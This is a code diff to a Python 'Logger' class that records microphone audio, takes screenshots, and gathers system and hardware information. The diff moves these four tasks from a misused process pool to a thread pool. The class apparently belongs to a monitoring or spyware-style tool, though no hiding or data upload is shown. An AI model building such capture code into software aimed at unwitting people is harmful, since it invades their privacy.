@@ -1,4 +1,4 @@
-from multiprocessing import Pool
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 import subprocess
 import logging
@@ -9,6 +9,14 @@ from PIL import ImageGrab
 
 
 class Logger:
+  def start(self):
+    with ThreadPoolExecutor(
+        max_workers=4) as executor:
+      executor.submit(self.microphone)            
+      executor.submit(self.screenshot)
+      executor.submit(self.get_sysinfo)
+      executor.submit(self.get_hardware_devices)
+
   def microphone(self):
     fs = 44100
     seconds = 20
@@ -49,7 +57,4 @@ class Logger:
     return datetime.now().strftime(format)
 
   def __call__(self):
-    with Pool(processes=4) as pool:
-      pool.starmap(
-        self.microphone, self.screenshot,
-        self.get_sysinfo, self.get_hardware_devices)
+    self.start()
